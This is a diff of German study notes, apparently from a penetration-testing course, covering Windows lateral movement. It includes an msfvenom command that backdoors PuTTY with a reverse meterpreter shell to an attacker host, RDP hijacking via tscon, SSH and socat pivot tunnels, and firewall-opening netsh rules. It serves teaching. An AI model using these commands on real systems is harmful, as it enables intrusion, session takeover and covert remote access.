@@ -687,9 +687,147 @@ Wenn die Datei eine Windows Binary ist, bspw. Putty, können wir es Downloaden u
 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
 ```
 
-Die herauskomme PuttyX.exe würde jedesmal einen reverse_tcp meterpreter Payload ausführen, ohne das der User da merkt. 
+Die herauskommende PuttyX.exe würde jedesmal einen reverse_tcp meterpreter Payload ausführen, ohne das der User das merkt. 
 
 ### RDP hijacking
 
+Wenn ein Admin Remote Desktop nutzt um sich auf einer Maschine einzuloggen und den RDP Client einfach nur schließt und sich nicht vorher ausloggt, bleibt seine Session auf dem Server erstmal bestehen. Wenn wir SYSTEM Rechte auf einem Windows 2016 Server oder früheren Versionen haben, können wir jede bestehende RDP Session übernehmen, ohne auch nur ein Passwort zu kennen.
 
+Wenn wir administrativen Zugang haben, können wir jede gewünschte Methode nutzen, um SYSTEM Rechte zu erlangen. Wir nutzen jetzt PSEXEC. Als erstes starten wir cmd.exe als Admin.
+
+![alt text](images/image10.png)
+
+Von da aus, starten wir PsExec64.exe aus dem Ordner C:\tools\ heraus.
+
+>PsExec64.exe -s cmd.exe
+
+Um sich alle existierenden Sessions auf dem Server anzeigen zu lassen, nutzen wir folgenden Befehl:
+
+```bash
+C:\> query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+ luke                                    3  Disc            .  4/6/2022 6:51 AM
+ ```
+
+ Ausgehend aus dem Output, wenn wir jetzt per RDP als Admin verbunden wären, wäre unser Sessionname *rdp-tcp#6*. Wir können außerdem sehen, dass der User mit dem Namen luke eine Session mit der ID 3 offen hat. Jede Session mit dem Status Disc wurde offen gelassen und ist nicht in Benutzung. Wenn wir eine Session übernehmen, wird der aktuelle User aus seiner Session geworfen, was etwas suspekt sein könnte.
+
+ Um sich mit einer Session zu verbinden nutzen wir tscon.exe und geben die Session ID mit an, die wir übernehmen möchten. In dem Beispiel oben wäre des Befehl also:
+
+ >tscon 3 /dest:rdp-tcp#6
+
+ Im Grunde besagt der Command, dass die grafische Session 3 von luke mit der RDP Session rdp-tcp#6 verbunden werden soll.
+
+ Als Ergebnis erhalten wir lukes Session.
+
+ **Achtung: Windows Server 2019 lässt keine Verbindung zu einer Session zu, ohne das Passwort zu kennen**
+
+
+# Port Forwarding
+
+Die meisten Methoden die wir bisher kennengelernt haben um sich lateral im Netzwerk zu bewegen benöigen spezielle Ports. In echten Netzwerken sind die Ports meistens aus Sicherheitsgründen geblockt. Oder die Netzwerke sind segmentiert, was uns daran hindert, SMB, RDP, WINRM oder RPC Ports zu nutzen.
+
+Um diese Einschränkungen zu umgehen, können wir Port Forwarding Techniken anwenden. Das bedeutet, wir nutzen einen kompromittierten Rechner als eine Jump Box um andere Hosts zu erreichen.Es ist zu erwarten, dass manche Computer mehr Rechte als andere im Netzwerk haben, da jede Abteilung unterschiedliche Anforderungen stellt, was Services angeht, die genutzt werden müssen.
+
+### SSH Tunneling
+
+Das erste Protokoll welches wir uns ansehen ist SSH, da es bereits eingebaute Port Forwarding Mechanismen enthält (SSH Tunneling). Bisher galt SSH als ein Protokoll, welches hauptsächlich in Linux System genutzt wurde. Doch Windows liefert mittlerweile mit OpenSSH ebenfalls einen SSH Clienten standardmäßig mit aus.
+
+SSH Tunneling kann auf verschiedene Arten zum weiterleiten von Ports durch eine SSH Verbindung genutzt werden, je nach Anwendungsfall. Um die Anwendungsfälle zu erklären, nehmen wir einfach mal an, wir hätten Zugang zu dem Computer PC-1 (ein Admin Zugang ist nicht zwingend nötig) den wir als Pivot nutzen möchten, um einen Port auf einer anderen Maschine nutzen zu können, welchen wir nicht direkt erreichen können. 
+Wir starten einen Tunnel von dem Computer PC-1, der sich als einen SSH Client ausgibt, zu unserer Attacker Maschine, welche sich als ein SSH Server ausgibt. Der Grund für diese Vorgehensweise ist der Umstand, dass man auf Windows System zwar oft einen SSH Client findet, aber keinen SSH Server.
+
+Die Grafik zeigt das Konzept nochmal deutlich:
+
+![alt text](images/image11.png)
+
+Sobald wir eine Verbdinung zurück zu unserer Maschine herstellen wollen, müssen wir einen User erstellen, der allerdings keinen Zugang zu einer Konsole hat und ein Password bestitzt um die Tunnel zu erstellen.
+
+```bash
+useradd tunneluser -m -d /home/tunneluser -s /bin/true
+passwd tunneluser
+```
+
+Je nachdem welche Anforderungen man braucht, kann der SSH Tunnel lokales und remote Ports weiterleiten. Wir schauen uns beide Fälle mal an.
+
+### SSH Remote Port Forwarding
+
+In unserem Beispiel gehen wir davon aus, dass unsere Attacke Maschine keinen Zugriff auf Port 3389 auf dem Server hat, da eine Firewall den Zugang blockiert. Wenn wir den PC-1 Computer übernommen haben, und dieser auf Port 3389 am Server zugreifen kann, können wir diesen als Pivot nutzen. Mit Remote Port Forwarding können wir einen erreichbaren Port vom SSH Client (also PC-1) nehmen und auf einen remote SSH Server projezieren (unsere Attacker Maschine).
+
+Als Ergebnis wird ein Port auf der Attacker Maschine geöffnet welcher dazu benutzt wird, eine Verbindung zurück zum Port 3389 durch den SSH Tunnel auf dem Server herzustellen. PC-1 wird die Verbindung stellvertretend herstellen und für den Server sieht es dann so aus, als würde der Traffic einfach von PC-1 stammen.
+
+Es mag eine berechtigte Frage auftauchen. Wenn wir doch sowieso die Maschine PC-1 kompromettiert haben können wir doch direkt mit einer RDP Session diese nutzen um auf Port 3389 auf dem Server zuzugreifen. Die Antwort ist simpel. In einer Situation in der wir nur Zugang per Konsole auf PC-1 haben, sind wir nicht in der Lage einen RDP Client zu nutzen da wir kein GUI haben.
+Indem wir den Port für unsere Attacker Maschine erreichbar machen, können wir auch das Linux RDP nutzen. 
+Ähnliche Situationen haben wir auch, wenn wir bestimmte Exploits nutzen möchten, aber der gewünschte Port ist nicht erreichbar, oder der Exploit benötigt eine besimmte Programmiersprache die nicht auf den Maschinen vorhanden sind, die wir kompromittieren. Man ist also deutlich besser aufgestellt, wenn man die Ports an unserer Attacker Maschine bereitsstellt.
+
+Im Bezug zu dem Bild von oben, können wir den Port 3389 mit folgendem Befehl den wir auf PC-1 ausführen, verfügbar machen:
+
+>C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+
+Damit stellen wir eine SSH Session von PC-1 zu 1.1.1.1 (Unsere Attacker Maschine) her und nutzen dabei den "tunneluser" user.
+
+Da der "tunneluser" nicht in der Lage ist eine Shell auf der Attacker Maschine zu starten, müssen wir den SSH Befehl mit dem -N Switch ausführen. Das hindert den Client daran, eine Shell anzufordern, was die Verbindung wieder sofort beenden würde. Der -R Switch wird benutzt, um einen Remote Port Forward anzufragen. Die Syntax verlangt von uns, erst den Port anzugeben, der auf unserer Maschine (SSH Server) geöffnet werden soll, gefolgt von einem Semikolon mit anschließender IP und Port des Sockets den wir weiterleiten möchten (3.3.3.3:3389). In diesem Beispiel stimmen die Ports überein, was aber nicht zwingend notwendig ist.
+
+Der Befehl selber würde keinen Output ausgeben, aber der Tunnel ist anhängig vom ausführen dieses Befehls. Wenn wir den Befehl mit CTRL+C abbrechen, schließen wir auch den Tunnel.
+
+Sobald der Tunnel offen ist, können wir mit unserer Attacker Maschine eine RDP Verbindung zu dem Server über den Port herstellen.
+
+>munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
+
+### SSH Local Port Forwarding
+
+Local Port Forwarding erlaubt uns einen Port from SSH Server auf den SSH Client zu ziehen. In unserem Szenario könnte das zum Beispiel bedeuten, dass wir einen Service auf unserer Maschine bereitstellen und diesen am PC-1 Computer verfügbar machen. Damit kann jeder Host, der sich nicht direkt mit uns verbinden kann, dennoch unseren Service über PC-1 erreichen.
+
+Mit dieser Art der Port Weiterleitung können wir auf Hosts Reverse Shells ausführen, die normalerweise keine Verbindung zu uns aufbauen könnten.
+
+![alt text](images/image12.png)
+
+Um den Port 80 von uns aus auf dem PC-1 weiterzuleiten, müssen wir folgenden Befehl ausführen:
+
+> C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+
+Die Befehlsstruktur ist ähnlich der "Remote Port Forwarding" aber nutzt -L für das lokale Weiterleiten. 
+Diese Option erfordert, dass wir den lokalen Socket angeben, den PC-1 verwendet, um Verbindungen zu empfangen (*:80), sowie den Remote-Socket, zu dem von der Perspektive des Angreifer-PCs aus eine Verbindung hergestellt wird (127.0.0.1:80).
+
+**Achtung: Wir nutzen die IP Adresse 127.0.0.1 im zweiten Socket, da aus der Sicht des Attacker PC´s dies der Host ist, der Port 80 zur Weiterleitung bereitstellt.**
+
+Da wir einen neuen Port auf PC-1 öffnen, müssen wir möglicherweise eine Firewall-Regel hinzufügen, um eingehende Verbindungen zuzulassen (mit dir=in). Administrative Berechtigungen sind dafür erforderlich.
+
+>netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+
+
+Sobald der Tunnel eingerichtet ist, kann jeder Benutzer, der mit seinen Browser  PC-1 unter http://2.2.2.2:80 besucht, die Website sehen, die von der Angreifer-Maschine veröffentlicht wurde.
+
+### Port Forwarding with socat
+
+In Situationen, in denen SSH nicht verfügbar ist, kann socat verwendet werden, um ähnliche Funktionalitäten auszuführen. Obwohl socat nicht so flexibel wie SSH ist, ermöglicht es Ports auf eine viel einfachere Weise weiterzuleiten. Ein Nachteil bei der Verwendung von socat besteht darin, dass wir es zum Pivot-Host (PC-1 in unserem aktuellen Beispiel) irgendwie übertragen müssen, was es im Vergleich zu SSH leichter erkennbar macht. Dennoch könnte es sich lohnen, es zu versuchen, wenn keine andere Option verfügbar ist.
+
+Die grundlegende Syntax zur Durchführung von Port-Weiterleitung mit socat ist wesentlich einfacher. Wenn wir beispielsweise Port 1234 auf einem Host öffnen und alle Verbindungen, die wir dort erhalten, an Port 4321 auf Host 1.1.1.1 weiterleiten möchten, würde der folgende Befehl verwendet werden:
+
+>socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
+
+Die Option "fork" ermöglicht es socat, für jede empfangene Verbindung einen neuen Prozess zu starten, was es ermöglicht, mehrere Verbindungen zu erstellen. Wenn wir fork nicht mit angeben, wird socat geschlossen, wenn die erste Verbindung beendet ist.
+
+Zurück zu unserem Beispiel, wenn wir auf den Port 3389 des Servers zugreifen möchten, indem wir PC-1 als Pivot verwenden, wie wir es mit der SSH Remote-Port-Weiterleitung getan haben, könnten wir den folgenden Befehl verwenden:
+
+>C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+
+**Achtung: socat kann die Verbindung nicht direkt zur Angreifer-Maschine weiterleiten wie SSH, sondern einen Port auf PC-1 wird geöffnet, zu dem die Angreifer-Maschine dann eine Verbindung herstellen kann:**
+
+![alt text](images/image13.png)
+
+Wie üblich, da ein Port auf dem Pivot-Host geöffnet wird, müssen wir möglicherweise eine Firewall-Regel erstellen, um Verbindungen zu diesem Port zuzulassen:
+
+>netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+
+
+Wenn wir andererseits den Port 80 von der Angreifer-Maschine freigeben möchten, damit er vom Server erreicht werden kann, müssen wir den Befehl nur ein wenig anpassen:
+
+>C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
+
+Als Ergebnis wird PC-1 den Port 80 erstellen und auf Verbindungen warten, die zum Port 80 auf der Angreifer-Maschine weitergeleitet werden sollen:
+
+![alt text](images/image14.png)
+
+
+### Dynamic Port Forwarding and SOCKS
 
